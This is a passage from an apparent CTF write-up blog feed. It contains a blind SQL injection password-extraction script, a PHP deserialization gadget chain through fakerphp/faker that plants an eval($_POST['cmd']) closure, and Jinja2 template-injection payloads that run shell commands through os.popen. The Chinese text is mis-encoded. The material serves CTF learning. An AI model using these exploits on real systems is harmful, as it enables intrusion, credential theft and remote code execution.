class="comment">#çˆ†å­—æ®µå id,username,password,ip,time,USER</span></span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr((select password from users where id=2),&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(i)  <span class="comment"># çˆ†password</span></span><br><span class="line">        <span class="comment"># payload = &quot;id=1 and ascii(substr(database(),%d,1))=%s&quot; %(j,str(i))  # çˆ†åº“å</span></span><br><span class="line">        <span class="comment"># payload = &quot;id=1 and 2&gt;1&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">        response = requests.get(url+payload)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag=&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Newser"><a href="#Newser" class="headerlink" title="Newser"></a>Newser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;instance = <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getEmail</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_password = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_username = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;_username&#x27;</span>,<span class="string">&#x27;_password&#x27;</span>, <span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;instance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; User bWlubmllLndlaW1hbm4= has created.</span><br></pre></td></tr></table></figure><p>å¯¹cookieè¿›è¡Œbase64è§£ç </p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220806191259786.png" alt="image-20220806191259786"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;*_username&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;ZGVyZWswNQ==&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;*_password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;03a83270035a975b5150954956db1a46&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Useremail&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;levi87@barton.com&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Userinstance&quot;</span>;r:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>cookieæ˜¯Userç±»å¯¹è±¡çš„åºåˆ—åŒ–</p><p>è€Œé¡µé¢å›æ˜¾çš„<code>User ZGVyZWswNQ== has created.</code>è¡¨ç¤º<code>__destruct</code>æ–¹æ³•è¢«è°ƒç”¨ï¼Œæ‰¾ååºåˆ—åŒ–åˆ©ç”¨é“¾</p><h3 id="composer-jsonæ³„éœ²"><a href="#composer-jsonæ³„éœ²" class="headerlink" title="composer.jsonæ³„éœ²"></a>composer.jsonæ³„éœ²</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;fakerphp/faker&quot;</span>: <span class="string">&quot;^1.19&quot;</span>,</span><br><span class="line">    <span class="string">&quot;opis/closure&quot;</span>: <span class="string">&quot;^3.6&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å¯¹äºfakerphpè¿™ä¸ªä¾èµ–ï¼Œä»–çš„Generatorç±»ï¼Œæ˜¯ä¸»è¦çš„ç±»ï¼Œç”Ÿæˆä¸å­˜åœ¨çš„å±æ€§æ—¶éƒ½é€šè¿‡formatæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¸­å­˜åœ¨call_user_func_array çš„è°ƒç”¨</p></blockquote><p>å…³é”®çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">trigger_deprecation</span>(<span class="string">&#x27;fakerphp/faker&#x27;</span>, <span class="string">&#x27;1.14&#x27;</span>, <span class="string">&#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;</span>, <span class="variable">$attribute</span>, <span class="variable">$attribute</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„Faker\Generatorç±»ä¸­æœ‰ä¸€ä¸ª<code>__wakeup</code>æ–¹æ³•ï¼Œä¼šå°†<code>formatters</code>çš„å€¼æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥æ— è®ºæˆ‘ä»¬åˆšå¼€å§‹å¯¹formattersèµ‹å€¼çš„æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šåœ¨<code>__wakeup</code>è¿™é‡Œå°†å…¶æ›¿æ¢ä¸ºç©ºæ•°ç»„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®˜æ–¹wpä¸­ï¼Œè¿™é‡Œç”¨çš„æ˜¯<code>phpå¼•ç”¨</code>æ¥ç»•è¿‡ï¼Œæ¯”è¾ƒå…³é”®çš„æ˜¯<code>è¯¥å¼•ç”¨è¯­å¥æ‰§è¡Œåœ¨ Generatorç±»çš„__wakeup å</code></p><p>å› ä¸ºä¸æ˜¯å¾ˆç†è§£ï¼Œæ‰€ä»¥æœ¬åœ°è°ƒè¯•ä¸€ä¸‹ï¼Œè®¾ç½®äº†formattersçš„ä¸¤ç§æƒ…å†µ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807001238313.png" alt="image-20220807001238313"></p><h3 id="phpå¼•ç”¨"><a href="#phpå¼•ç”¨" class="headerlink" title="phpå¼•ç”¨"></a>phpå¼•ç”¨</h3><p>å½“å…¶ä¸ºåœ°å€æ—¶ï¼Œåœ¨<code>Faker\Generator</code>çš„wakeupæ‰§è¡Œå‰ï¼Œè¿™ä¸ªformattersä¸ºnullï¼Œwakeupæ‰§è¡Œåï¼Œå…¶å˜ä¸ºç©ºæ•°ç»„</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807001458924.png" alt="image-20220807001458924"></p><p>è€Œåœ¨Userç±»çš„wakeupæ‰§è¡Œåï¼Œè¿™ä¸ªformatterså˜ä¸ºäº†<code>[&quot;_username&quot;=&gt;&quot;phpinfo&quot;]</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807001702781.png" alt="image-20220807001702781"></p><p>è¿™æ˜¯ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç°è±¡ï¼Œè¿™å°±å¯¼è‡´äº†wakeupæ–¹æ³•çš„é˜²æŠ¤æ˜¯æ— ç”¨çš„ï¼Œå¯ä»¥é€šè¿‡phpå¼•ç”¨å¯¹å¯¹è±¡ä»»æ„èµ‹å€¼</p><h3 id="éphpå¼•ç”¨æƒ…å†µä¸‹"><a href="#éphpå¼•ç”¨æƒ…å†µä¸‹" class="headerlink" title="éphpå¼•ç”¨æƒ…å†µä¸‹"></a>éphpå¼•ç”¨æƒ…å†µä¸‹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $this-&gt;formatters = &amp;$obj-&gt;password;</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;formatters = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶<code>Faker\Generator</code>ç±»å¯¹è±¡åœ¨wakeupå‡½æ•°æ‰§è¡Œå‰ï¼Œformattersä¸º<code>[&quot;_username&quot;=&gt;&quot;phpinfo&quot;]</code>ï¼Œä½†æ˜¯åœ¨wakeupå‡½æ•°æ‰§è¡Œåï¼Œè¿˜æ˜¯è¢«ä¿®æ”¹ä¸ºäº†ç©ºæ•°ç»„</p><p>å¹¶ä¸”å› ä¸ºæ²¡æœ‰ä½¿ç”¨phpå¼•ç”¨ï¼Œæ‰€ä»¥formatterså§‹ç»ˆä¸ºç©ºæ•°ç»„</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807002107803.png" alt="image-20220807002107803"></p><h3 id="expåˆ†æ"><a href="#expåˆ†æ" class="headerlink" title="expåˆ†æ"></a>expåˆ†æ</h3><p>è¿™é‡Œåˆ†æä¸€ä¸‹è°ƒç”¨phpinfo()çš„åŸç†ï¼Œ<code>__get</code>æ–¹æ³•ä¸­å‚æ•°ä¸º<code>__username</code>ï¼Œç„¶åä¸€è·¯ä¼ å‚ï¼Œåœ¨æœ€å<code>call_user_func_array($this-&gt;getFormatter($format), $arguments);</code>é‚£é‡Œï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯<code>phpinfo</code>ï¼Œè€Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºï¼Œæ‰€ä»¥å°±æ˜¯è°ƒç”¨phpinfo</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807002958404.png" alt="image-20220807002958404"></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807003144032.png" alt="image-20220807003144032"></p><p>è°ƒç”¨éphpinfoå‡½æ•°</p><blockquote><p>å› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡__get ä¼ å…¥çš„ï¼Œä¼ å…¥å‡½æ•°çš„å‚æ•°ä¸å¯æ§ï¼Œphpinfoä¸éœ€è¦å‚æ•°ï¼Œæ‰€ä»¥è°ƒç”¨äº†ã€‚å¦‚æœæƒ³è¦åªæ§åˆ¶å‡½æ•°ï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œå¯ä»¥ä½¿ç”¨ååºåˆ—åŒ–é—­åŒ…ï¼Œè¿™åœ¨ä¹‹å‰ä¹Ÿæ˜¯æœ‰è€ƒè¿‡çš„ã€‚ç›´æ¥åŒ…å«closureä¾èµ–ä¸­çš„autoload.php</p></blockquote><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807004720019.png" alt="image-20220807004720019"></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807005604354.png" alt="image-20220807005604354"></p><p>æ•´ä¸ªè¿‡ç¨‹ä¸­è°ƒè¯•çš„ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="title class_">Faker\Generator</span>(<span class="variable language_">$this</span>);</span><br><span class="line">            <span class="comment">// $this-&gt;_password = [&quot;_username&quot;=&gt;&quot;phpinfo&quot;];</span></span><br><span class="line">            <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&#125;;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">&#x27;vendor\opis\closure\autoload.php&#x27;</span>;     <span class="comment">//ç›¸å¯¹è·¯å¾„</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$b</span>=Opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">serialize</span>(<span class="variable">$func</span>);   <span class="comment">//è°ƒç”¨è¯¥serialize()</span></span><br><span class="line">            <span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>); </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="variable">$c</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s:8:&quot;password&quot;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;s%3A14%3A%22%00User%00password%22&quot;</span>),<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>()));</span><br><span class="line">        <span class="comment">// echo &quot;è¿è¡Œ&quot;;</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str1</span>));</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str1</span>);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = &amp;<span class="variable">$obj</span>-&gt;password;</span><br><span class="line">            <span class="comment">// $this-&gt;formatters = [&quot;_username&quot;=&gt;&quot;phpinfo&quot;];</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// trigger_deprecation(&#x27;fakerphp/faker&#x27;, &#x27;1.14&#x27;, &#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;, $attribute, $attribute);</span></span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ€åçš„Newserçš„<code>phpå¼•ç”¨</code>å­¦åˆ°äº†ï¼Œè€Œ<code>åŒ…å«closureä¾èµ–ä¸­çš„autoload.php</code>é‚£é‡Œè¿˜ä¸æ¸…æ¥šåŸç†ï¼Œè¦ç»§ç»­å­¦ä¸€ä¸‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> DASCTFä¸ƒæœˆèµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BDSecCTF2022-Web</title>
      <link href="/2022/07/22/BDSecCTF2022-Web/"/>
      <url>/2022/07/22/BDSecCTF2022-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="BDSecCTF2022-Web"><a href="#BDSecCTF2022-Web" class="headerlink" title="BDSecCTF2022-Web"></a>BDSecCTF2022-Web</h1><p>[toc]</p><h2 id="Jungle-Templating"><a href="#Jungle-Templating" class="headerlink" title="Jungle Templating"></a>Jungle Templating</h2><p>æ¨¡æ¿æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720232832016.png" alt="image-20220720232832016"></p><p>è‡ªåŠ¨åŒ–è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;  c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720233225401.png" alt="image-20220720233225401"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;  c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p><img 